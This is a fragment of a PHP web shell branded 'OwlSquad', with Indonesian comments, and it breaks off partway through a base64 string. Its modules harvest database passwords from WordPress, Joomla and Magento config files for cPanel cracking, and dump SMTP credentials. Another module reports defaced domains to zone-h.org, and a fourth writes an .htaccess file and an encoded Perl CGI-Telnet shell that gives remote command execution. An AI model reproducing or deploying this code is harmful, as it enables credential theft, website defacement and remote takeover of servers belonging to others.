				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'smtp') {
	echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=#4c83af>$smtp_host</font><br>";
				echo "SMTP port: <font color=#4c83af>$smtp_port</font><br>";
				echo "SMTP user: <font color=#4c83af>$smtp_user</font><br>";
				echo "SMTP pass: <font color=#4c83af>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=#4c83af>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=#4c83af>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=#4c83af>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='OwlSquad'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('OwlSquad_cgi', 0755);
        chdir('OwlSquad_cgi');
	$file_cgi = "cgi2.OwlSquad";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .OwlSquad \n AddHandler cgi-script .OwlSquad \n AddHandler cgi-script .OwlSquad";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojIENvcHlyaWdodCAoQykgMjAwMSBSb2hpdGFiIEJhdHJhDQojIFJlY29kZWQgQnkgQ29uN2V4dA0KIyBUaGFua3MgVG8gOiAweDE5OTkgLSBYYWkgU3luZGljYXRlIFRlYW0gLSBBbmQgWW91DQogDQokV2luTlQgPSAwOw0KJE5UQ21kU2VwID0gIiYiOw0KJFVuaXhDbWRTZXAgPSAiOyI7DQokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwOw0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsNCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDogInB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0Kc3ViIFJlYWRQYXJzZQ0Kew0KICAgIGxvY2FsICgqaW4pID0gQF8gaWYgQF87DQogICAgbG9jYWwgKCRpLCAkbG9jLCAka2V5LCAkdmFsKTsNCiAgIA0KICAgICRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KIA0KICAgIGlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpDQogICAgew0KICAgICAgICAkaW4gPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsNCiAgICB9DQogICAgZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpDQogICAgew0KICAgICAgICBiaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7DQogICAgICAgIHJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQogICAgfQ0KIA0KICAgICMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCiAgICBpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCiAgICB7DQogICAgICAgICRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcNCiAgICAgICAgQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsNCiAgICAgICAgJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCiAgICAgICAgJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KICAgICAgICAkSGVhZGVyID0gJGA7DQogICAgICAgICRCb2R5ID0gJCc7DQogICAgICAgICRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUNCiAgICAgICAgJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7DQogICAgICAgICRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsNCiAgICAgICAgJGlueydmJ30gPSAkMTsNCiAgICAgICAgJGlueydmJ30gPX4gcy9cIi8vZzsNCiAgICAgICAgJGlueydmJ30gPX4gcy9ccy8vZzsNCiANCiAgICAgICAgIyBwYXJzZSB0cmFpbGVyDQogICAgICAgIGZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQogICAgICAgIHsNCiAgICAgICAgICAgICRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KICAgICAgICAgICAgJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KICAgICAgICAgICAgJGtleSA9ICQxOw0KICAgICAgICAgICAgJHZhbCA9ICQnOw0KICAgICAgICAgICAgJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCiAgICAgICAgICAgICR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQogICAgICAgICAgICAkaW57JGtleX0gPSAkdmFsOw0KICAgICAgICB9DQogICAgfQ0KICAgIGVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KICAgIHsNCiAgICAgICAgQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KICAgICAgICBmb3JlYWNoICRpICgwIC4uICQjaW4pDQogICAgICAgIHsNCiAgICAgICAgICAgICRpblskaV0gPX4gcy9cKy8gL2c7DQogICAgICAgICAgICAoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KICAgICAgICAgICAgJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCiAgICAgICAgICAgICR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQogICAgICAgICAgICAkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCiAgICAgICAgICAgICRpbnska2V5fSAuPSAkdmFsOw0KICAgICAgICB9DQogICAgfQ0KfQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQokRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQpwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8dGl0bGU+Q29uN2V4dCBDR0ktVGVsbmV0PC90aXRsZT4NCiRIdG1sTWV0YUhlYWRlcg0KPHN0eWxlPg0KQGZvbnQtZmFjZSB7DQogICAgZm9udC1mYW1pbHk6ICd1YnVudHVfbW9ub3JlZ3VsYXInOw0Kc3JjOiB1cmwoZGF0YTphcHBsaWNhdGlvbi94LWZvbnQtd29mZjtjaGFyc2V0PXV0Zi04O2Jhc2U2NCxkMDlHUmdBQkFBQUFBR1dJQUJNQUFBQUF2REFBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQkdSbFJOQUFBQnFBQUFBQndBQUFBY1pPK0hkRWRFUlVZQUFBSEVBQUFBS1FBQUFDd0NJd0VKUjFCUFV3QUFBZkFBQUFBeUFBQUFRRFhPVHJCSFUxVkNBQUFDSkFBQUFWa0FBQUlHbE52SnFFOVRMeklBQUFPQUFBQUFYUUFBQUdDWlZRVFpZMjFoY0FBQUErQUFBQUdPQUFBQjZnQ0xqQlpqZG5RZ0FBQUZjQUFBQUVvQUFBQktFMGtPYzJad1oyMEFBQVc4QUFBQnNRQUFBbVZUdEMrbloyRnpjQUFBQjNBQUFBQUlBQUFBQ0FBQUFCQm5iSGxtQUFBSGVBQUFWbUVBQUtXMElydDJQR2hsWVdRQUFGM2NBQUFBTUFBQUFEWUF5MkxEYUdobFlRQUFYZ3dBQUFBY0FBQUFKQXFtQlA5b2JYUjRBQUJlS0FBQUFXZ0FBQU9paG1GeENHeHZZMkVBQUYrUUFBQUJ5QUFBQWRRT1VUYVFiV0Y0Y0FBQVlWZ0FBQUFnQUFBQUlBSUdBaFZ1WVcxbEFBQmhlQUFBQVhzQUFBUE9ZbGVLclhCdmMzUUFBR0wwQUFBQjRnQUFBdFFzQnFVTWNISmxjQUFBWk5nQUFBQ25BQUFCQnFRVHZHNTNaV0ptQUFCbGdBQUFBQVlBQUFBR2RWdFNwZ0FBQUFFQUFBQUF6RDJpendBQUFBREo1YjdMQUFBQUFNN01KZGw0Mm1OZ1pHQmc0QU5pRlFZUVlHSmdCdUk2QmthR2VvWkdJS3VKNFFXUXpRS1dZUUFBTm1JRExRQUFBSGphWTJCa1lHRGdZckJoc0dOZ1RxNHN5bUVRU1M5S3pXYVF5MGtzeVdQUVlHQUJ5akw4L3c4a3NMR0FBQUIza3d2N0FBQjQybldSeDBwRFFSaUZ2K3MxTGtKd0ZRdmlJb2dsOWhoakw4UVNCR01NWEYyNUVHS01Ma3dpM0JoQmlTdDc3dzA3UG9XNHM3eUlMNkovaG92Z1FvWTVmNWx6WnM3TW9BRjJIdmxDank2WmNaeXpabXlPOW5oa0lja3doZWo5UTRhTHdsQndVSERNNkJlRTcyOXlSYWVSSXpHYi9lMlVZZXViQ0xqd0RoampncUh3aUF1L0VRNEpqaHRCNlNpK3plTHJXZVVmZmJiU3Bjcm10c2lNR2NVVmphUml1SlBwaEVuRHZEbWR4SmRLZWJ4MEtsYU9ZbXZXRGlqVWZsZHNPSEJTU2psMXFxdmh0bUtyRmYza3FUaHExVk9pYzRneVE1cEZxWFVLNU5aRjByWExUTENpZkFZWSs0ZW5TMTRzTTkveW9xdjFqT1ZwV1Z4WFVFbVYrS2ltaGxyeFZVOERqWGhva3JkcHhrZUxlR3VqblE3aGR0Rk5ENzJzc3NZNkcyeXl4VFk3N0xMSFBnY2Njc1F4SjV4eXhqa1hYSExGTlRmY2NzYzlEL0szVDN6eXJsNHp3S1I0ZU9hRkVsNTVrL00rWkhUOEFHblZTcUVBQUFCNDJtTmdabjdCT0lHQmxZR0ZkUmFyTVFNRG96eUVacjdJa01iRXdNREF4TTNLeWN6R3hNekU4b0NCNlg4QWcwSTBBeFM0T1BvNk1qZ3c4UDVtWWt2N2w4YkF3TGFFcVUrQmdXRitHQ05ROXphV0wwQWxDZ3hNQUwzNkQ3NEFBQUI0Mm1OZ1lHQm1nR0FaQmtZR0VIZ0M1REdDK1N3TUo0QzBIb01Da01VSFpQRXl5RExVTWZ4bkRHYXNZRHJHZEVlQlMwRkVRVXBCVGtGSlFVMUJYOEZLSVY1aGphS1M2cC9mVFAvL2cwMENxVmRnV01BWUJGWFBvQ0NnSUtFZ0ExVnZDVmZQQ0ZUUC9QL3IvMmYvbi93Ly9ML3d2KzgvaHIrdkg1eDRjUGpCZ1FmN0greDVzUFBCeGdjckhyUThzTGgvK05ZcjFtZFFkNUlBR05rZ1hnU3ptWUFFRTVvQ29DUUxLeHM3QnljWE53OHZINytBb0pDd2lLaVl1SVNrbExTTXJKeThncUtTc29xcW1ycUdwcGEyanE2ZXZvR2hrYkdKcVptNWhhV1Z0WTJ0bmIyRG81T3ppNnVidTRlbmw3ZVByNTkvUUdCUWNFaG9XSGhFWkZSMFRHeGNmRUppRWtON1IxZlBsSm56bHl4ZXVuelppbFZyVnE5ZHQySDl4azFidG0zZHZuUEgzajM3OWpNVXA2WmwzYXRjVkpqenREeWJvWE0yUXdrRFEwWUYySFc1dFF3cmR6ZWw1SVBZZVhYM2s1dmJaaHcrY3UzNjdUczNidTVpT0hTVTRjbkRSODlmTUZUZHVzdlEydHZTMXoxaDRxVCthZE1acHM2ZE40ZmgyUEVpb0tacUlBWUFKb2FNeEFBQUFBQUR0Z1QwQUpBQWh3Q0pBSXNBbGdESUFSSUFxQUVHQUprQW93Q29BS3dBc0FDMkFKVUFvUUNjQUs0QWRRQ3lBSGtBZkFDVEFLb0FqUUNmQUtZQWR3QnRBSEFBZndCRUJSRUFBSGphWFZHN1RsdEJFTjBORHdPQnhOZ2dPZG9VczVtUXhudWhCUW5FMVkxaVpEdUY1UWhwTjNLUmkzRUJIMENCUkEzYXJ4bWdvYVJJbXdZaEYwaDhRajRoRWpOcmlLSTBPenV6Yzg2Wk0wdktrYXAzNld2UFUrY2trTUxkQnMwMi9VNUl0Yk1BOTZUcjY0Mk10SU1IV214bTlNcDErLzRMQnB2UmxEdHFBT1U5YnlrUEdVMDdnVnEwcC83Ui9BcUcrL3dmOHpzWXREVFQ5TlE2Q2VraEJPYWJjVXVEN3huTnVzc1Arb0xWNFdJd01LU1lwdUl1UDZaUy9yYzA1MnJMc0xXUjBieURNeEg1eVRSQVUydHRCSnIrMUNIVjgzRVVTNURMcHJFMm1KaXkvaVFUd1lYSmRGVlR0Y3o0MnNGZHNyUG9ZSU1xellFSDJNTldlUXdlRGc4bUZOSzNKTW9zRFJIMllxdkVDQkdUSEFvNTVkekovcVJBK1VnU3hyeEpTanZqaHJVR3hwSFh3S0EyVDdQL1BKdE5iVzhkd3ZoWkhNRjN2eGxMT3ZqSWh0b1lFV0k3WWltQUNVUkNSbFg1aGhyUHZTd0c1Rkw3ejBDVWdPWHhqMytkQ0xUdTJFUThsN1YxRGpGV0NIcCsyOXp5eTRxN1Zybk9pMEozYjZwcXFOSXB6ZnRlenI3SEE1NGVDOE5CWThHYnovditTb0g2UEN5dU5HZ09CRU42TjNyL29yWHFpS3U4Rno2eUo5Ty9zVm9BQUFBQUFRQUIvLzhBRDNqYTdMME5mQnZsbFRjNno0eStMT3RqUnArV1pGbVdGVmxSRkhraUtZcWlPSTRkeHhqSEdOZDFYYTlyakFraDVBdlNZSXhKZzV2MTlXYlROQTNCQ1FHYXBpbE5hWmJONXViTnpzZ2lVSmZTVUxhWHNpekw5bkliZmx6ZWJyZmJiVmwzYVpkU3l2S1JpUGVjWjBiK2lPMlE3YmJ2ZSsvdjk1WmFIelBLekhuT2M1NXovdWZqT2NPd1RCUERzSnUwbjJZNFJzL1V5SVFSVitmMG10Q3ZrckpPKzk5WDV6Z1dQakl5aDRlMWVEaW4xeTI2dERwSDhIaEtDQXJob0JCc1lpc0xpOGl4d2xidHB6LzRQNXMwTHpGd1NUTDQwUnZzUHMwN1RDbmpZVnFZWEFuRHhHU3VaREpuWnBrWWtieWl4RnlVZGFXVCtEZHUxVEdHbUd3U0ppV1RLRnVGU2RsSFlyTFZKTmprRWk2YlpXUXpKOWdrUjNaWklyeDhSU3JwY2pwMG9hcHF1NUFTSEJaV0g2cmh5R0JuSnR2UmtjMTBpdWMxUnJQdUhwM1pxQm1zYjJ1cnI3K3hqZHRHZWdxbjIwWUc3MXBUTnpBNGdyUVp1QUgyUGUxT3BvU3hNeldNcEJjbFBwVW5KWXhCRTVOS2swUnlVT280MDZURThiSVJhREdiSm1VbmlUSExFaVNkZ3R2RFRVbDQ2aE14UE9ya3V5MU8wdm1vMDlMTk83V09tMjd1ZldQRGhqZjYxSGU0SjVOaEdPNEY0SWVQQ1pDYm1ad1grSkZ6dWp5cFZDcW5CNWJrREtVbStKeG5pRmR2am8yelFybC9rVHNsTTlySmNZZTd6TGZJbmN4ck5mUVV4MWNFOEpSV016bXVLekdhNFJTUktrWEplMUgyQU1VZVhuWUJ4VTdUSkZ6ZUdCdHZjTnBMWXBJbE9XNXd1b0RKZXZpSlhwUU5jRnB2d05ONkJrNXJrcEtUbDB2aDM1bGdwRUVTazFaNEo5Yjg2enUxakRObW5GanozanRIOElQazVjZFpyOTRPTk5CWEhiN0NEY2RMUEFiNDRPTEhqYTVTK09Ea3g4MU9FL3lBcDY4Q2ZYWGdLLzdHVFg4RC82cU0vaXU0cHE5NG5mTGlkZno0bS9HSzRpOERlSnhyNEZrT0I4d0x5SkZ5ZjBXZzVvci9TUTFlbUNKN09tVVB3VitLbzMvT0VQMEwyZkV2QTZjeWo5YTkvbDdEVitwL1ZuZThidStqOVQrbW4rSHZpWi9XLzVTMEh5RE4rMGxIUWNLLy9ZV0pBNFVjYWNjL09BNXlUWmlkSDJXNW85cURUSm81emtncFVWcVdralhjWkM2bFFXYW1rc0RNU2xGMmFXRWlramxYSlI1MHVVdEE0bGVJa3YyaUhPSW5wUkF2SjRIRHJxU2NnTWtvUzBvSlhpNEIxc2RCOERQd0hyS0R0Sk9zbEJSa3F5V2JsUksybktaeWNSWStsUWhTTkN2RmJYSzVINWVGSmdVL1pMSlNwVEJPN1A3NEluZFdjdG1rY2xnbjlhU0NwSkpyMlBUeUdqWlN3NldYcjhpQXRGWVF0NzZHaEtwMFRrY0Y2NjdnVUh5ZG9YUU4yUm5QZkhtd2RkT3Fza1RYOWxXWkhWM3BFMGVQZFI2SWhtSjdOKzBjQ2pYMlpKcjNicXo5K3VQSFJyKysvUUdmNkk3VmhsSXRtWmpEa1d6WjFMcjNsT3VWbHpRVndoZ2Y2bXlQWmVOaGg2KzJjN0JqOTJuSG03L1FKSUJsakpZSmYvUno3bld0QlhTQkZlUS93cVNZTTB6T2hDc2dEQy81bUlaWnBJbFJ6UUFLQnc1NDZJRjhJaERtelBDbWZMT1gwRzkyK28xSXkzR041bmtidzhPaTVhblE1M1hLTngwdmw4TzN4Y3EzeGJ4Y0E5K3E2RGM1RFF4MjhZSXRWMklGMVpLVmF4YkRaM000a0VXR0psRGxsRmZCWVEvTWdheGpzc0JMKzB5ZFExS0VjN2hTeVJYcDVkWEFTRExqWEdiRzhmQ3VyVnQzM2J0dDZ5NExaemg4NmIxZ1NoUVRDVkZNa1QzM3dFRTRPYlFIditKaDdvY252dkdORXlkT25icjBvdWFkRDAzY0QvdDI3ZXFEdjB2dm52akdZMTg5OGRoako5UURvS0hyUDNxTGUwSExNekZtQmRQSWJHVnlWY0ErS1pMS2xRTFg1QWJOSkpIV1VkVzExQWk2WVNrcTFZeDVVbHJLeTNVd2JCNldkaE84WjVhQzJIQlpxVTdJbDBaU3krMG9ON3h0M09WZWxJQ1BqTnhRSmRqT016cCtrYmg4RlJ5Z0hNalVrUFR5Tld3cVdjR2kxTGhCbE5hUWpOdEM5UEFwVkIyeGdGalZzQmxIQmNHZndsZTd3d1cvVUxoUmYvdWQ2YldwN3J0V3B6ZTNpL2Q5b1RuVUZ1RTl1a01tTVNSMmgzS2hXT05qUGUzM2RTODcwN25yNEtxbUk0MjFxenZDcXpkMmRxVFNONVAwaHU5M3RSeHQ3OWgxUTZTeWFXTkQvL05kTjBhN3hPeitUdHV1YjkvUWVMQzlaVzNuOWFuZVhaMGQyN3kxblgyUHRxZnZaL3RxTjdmWDNWL2J1cjRMMXl0NW5HdGplMERYbTVrZ0k1V0lxcG9ua2tYUjhmd2svYk5PSzNmVnBEeWUweG5OaHEwR3MxR0grangrejU3ZG9yaDd6NzJvQTk0b25PSGMyaE1NRC9hRFNBSzlrc0U4S2R2b1ZlekxiUmwzU01mU1ZhYXZadC80NVdRdis4d0w0cTBQYjduNXpUZlljSUc4ZkdiNGFPRlBmemI0MHROU3ovQTU4dExNYTlyb05lMmlaTGtvYStDYUR1V2FHWmVOV3J0SWFvVU5WL1ViY0tuVlErZnV1WWw3NWtYeHRvZTF3ZUZ6aGRSSHpNaTdQM3V4YS9nb0dmMlh3Yi83am9UWEhXSVo3aURZbmFWTU5WaGhhbnpqb21TNEtKZkNzR0ZoeUtVR3daYlhXdHlWVVp4OXZCWE9iZzJwSTlTK3JTSDFvRGJvUkFlSVBrSW4xMG9pR1poKytEeVVzYlFjYWVSOWtvOXZIR3V4cEUydFgydkw3SW9heGtwajF3V0MxNG1saDR6eHdVemIxMXU0bzZkMS91dkNyU2R2dEZyYnY5NGFhZkxxVG12Y1pZYlVRSDNwVmxQZGcwMU5SOVlZTjV2cmQ2YU03aktrdTUvcDRVNXhyNFBPNkdRa1JwVDBLWmx3azVJMm1XTUlhbFhHV0JMTEVRWS9FZzRWckVtVWpCY2xOaW1YMkNiQm9PVktqSGl1UkE4L001YmdSeU5ZT3Rtc3NETWRCUFFRZEFhRmtOQlBlaDRpdllYSEh5S3ZqSkhkaGYxamhYMWttS0d5a3lpOHhyNU0vREFqaXhtWWtueXBLanNPWkdEZVVzcFlRS01BTHBBdHdFTkppOXpUcnVIb1dsSDBBa3dZU1lSYjZoTFd4dHErMnJaMjhkYXhqWThaaElBWTFmWEVPcnQydE5lT0RuU1k2TDBDNUNuMnAyd1ByUElxSEs5TTlKUDRSeVNOS0RPZ3Y3aFN4Z2gzMDZxQ0duVEN2L2dlZWVya1NmaTMyd0ZySFNOQjRGVmFRVnA1cm9ReGcwcWQ4Wmt5Q0RTbWpsS3R2cW5zbUFtcnlQYk81cWJPenFibXpyMzF0OXhTWDNmTExaUVh6S0hDT1c1UWV3em91NTdPQjVkQzB1Z2FzbEtjUklBUHJIRVNLVVQwc1BxdE4rOUcwS0NSR0Y0aUYrQVhFbnVCbFFsTHpUVEJTUUJsZW9oZGZlYnlEd3JuZEw5ODM0WDM0Wmgrc0JXUGdZNHJaUUtnNTI1VGthT2duNlNtUWZicEovT2hhQWxZQWpsVUF0eFpTa2t3QVFrbVhxNEVQbFdYTW5XZzlhc1ZHS1N6VHNweGVLK3VGR3pqSllLUG94b3VGSVZ2T3BPTFVkUWJiMHNsYlFMUGhxcFlPNnpab3VFTVZWbFk5d3pPOUwvKy9BdXZ2ZmJDODYrZjlXVDdtNXY3czU3aSs5N0dkS3FoSVpWdVpJZGh0WFFYemhTZWhmLytpdndKcWQvNjdZT2RuUWUvdlZWOTcweC82bFBwZEh1N3d0UGpNT0JSV0pzOGFQT2NBY2Rab29nNFI5ZXBnQkl0YTQyVE9TMlZaUzJWWlMyVlpRUElNcWdiT0V1Vk9iSVRWbVJLU0RtRElOc1dUbjk4Ni9lNzduM3JjamV4dWV0djZJeHd2NDUrL3RZUHZ6bzJ4dTEyeEtKaEtuUE1FTngvREhpOUZQbnN4UHZiQU1wb2tjOFJGRDFRRkdVWFpSdmdjaHN2VjhIZEROYkpuS0VLQ1RBNGdBQlVIN1l5c0pUT3BZQk9xb1J4czlZZm9SeTJPWUdzc3F3VUVjWVpnMytwd3VjMVhIRlJXRGduTEw3cTVXaFRNbXU0SXJmMVEzeGozK0RhNTU5SmRkMlJDWHl5TmNGZWY1bGhWL1hldFRMZVZSOEoxYmJIMHoxTkNaTm10MjJGV0huK1RPTjl1d1l6Z2U3ZTdzQ1kwVzNzUHZybjk2eU1kM2YzSlRMdEtZOC9HbEhHdUJ2azZRQ01NY2tBNnE3Qk1XcEFsaXB3akc2UUpZdTVwZ0preWFLRjRRS2EwMStVb3lCTGpzcUxnaHdDMlZrTzYwUFcxQ2c0eXl6SUpBb0R0ZGlrNnF6a0ZtUnZDTDVWMkNUZkZPUmFnVU9KZ1IyaE1vVEdUeDlaUTRwbXM0TGc2TkZTN2c0R3g3WStkaURiUDl3VVd4M2YwSkVZN2U0WmpqYkd6dDJ4NlhCZmZOc25ONDVsQm5MRDRxYnVwc2dSUGo1NlozUC9xcklEZHJHemZ1dG5VcjdSd0xwRTcrN3JOOTBmOXYvRmx6b1BiVjVsZGJuUjUySmFZVDRuUUo0c2pKUFp3T1RNaUxCMENLZ1lxMWxuamtrR2NDaDBrNUlSSEFhWEtKa3ZTbnhTTmdGQTBDZHpKalBPcWdtVnF0bUVIODJvTGQzb0VaaGg5RHFZVXl1ajRGS2RJQWs0bldsUWRTaHdJVkNpWVpTNTF0RG5qcDN0T2ZYd3c2Y0tPOGpSek1EMm0wblQzWjAvK3BmWGV5NjlmckR3TkdrNkNNYjU4TmRPMFhuWmovTUN0RWFZWHpPNVVIRmU3RGd2TG00eTc3T0U3REF2UHB5WHhhSlVjbEd1Z09tSUtycWwvdUtIVkxkSXZocUxKUEJnZkdTci9uMHRmSlJkK3ZjbjZ2LzJnNytIMDZXU2xSL25yUUw0RUQ1d08zd3VjQ25LNkt1SHZucnhOUWMvcVB4UzVaZENPb3RneStiZ0RMeEozaXdLTHdqeWVTc3Z1TXM4WHRYQklBMGxMdC9zUTRvNmt5dEtZQms0bkJTV2h4UnhzWUM0VklDQStCQ1R5M2E0c0dTN0FwdUhnSVd3RUdDNWFseEYwZGdmREI3WTJybHpYVUFjK3R2akpxdFJwMkUzRnBLczNtQmdpZTJEOU1DNVhZa04zV3RSTE1MMW5mSG1PMXNqdlk4Ky9GRG5ZZjlOVy9yOXhoOS91MnNNQk1MaFJubllDVHcrcHZtQThUSng1aFltVjRaY3JpeXVjQjF3MmJLNFRJdlNyd011MTFCTjZnUHBCM2FHWWVMdHdIQVIzc00rZ01pV3NsTDBRT3lDck5YaElCZURRcFVaTzY0R1FTcWxJTkcyWWhFZ1FrNWZsSGNjRGtKQ2RzWmkwRGwyYnBvZ3BYOXAzWkU3Mk85SkRLM2Qvc2hOMFpyK28xdGUrWWV6cnN3dDYrcytsWFlQN0c2OE04T1NTMDhSLzRVdDdHRTJ0dUhMTzkzbGEzZU10VFVmMmQxR2ZKYzZEdTJvVDdWdmlPM1o2eWx6TEFaWkdnVzVQMFhsZnJWaUwzSUVSOGlnRHJOUzRUSHdvTGdvQ2pBQVdKQjUxR1V3WTVJUmhrSVlxa0lwS25CYWlKSG9ReXU4YkdhVUM5VWRIdTAzL2JYeDAvY2V2azZ6NGFFSFduNVRlS1Z3NXN3UjBrd1NSTk9sMkt1dHlHUFFMejZ3VnJXNDZ0ekk1YUJ1TW1kRUdqTEkydFdVdGVXdzByU29XQUNkUytYVUNaU3RjS3dhanprQTZpRklUd0k0ZjhMSXVZTlJHMVdrbVNCOFo3UldSMVNjd3VMVk02RzRZcHhxWmpKNkJ2eFc5T3JXWFozbjByY2Q2dG44WUc5MDUvV3Z2UGp5cnEvZUhE